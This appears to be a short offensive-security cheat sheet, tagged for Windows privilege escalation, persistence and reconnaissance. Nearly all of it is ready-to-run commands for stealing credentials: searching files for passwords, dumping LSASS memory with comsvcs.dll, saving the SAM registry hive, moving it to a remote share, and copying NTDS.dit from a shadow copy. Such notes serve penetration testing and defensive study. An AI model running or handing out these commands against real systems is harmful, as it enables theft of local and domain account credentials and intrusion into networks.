# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

## Powershell - List running processes
```
tasklist /svc
```
## Powershell - Search for "password" in files
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Display LSASS process information
```
Get-Process lsass
```

## Create LSASS memory dump
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

## reg.exe - Save a copy of a registry hive
```
reg.exe save hklm\sam C:\sam.save
```

## Transfer file to a file share
```
move sam.save \\<ip>\NameofFileShare
```

## cmd.exe - Copy NTDS.dit from shadow copy
```
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## vssadmin - Create volume shadow copy
```
vssadmin CREATE SHADOW /For=C:
```
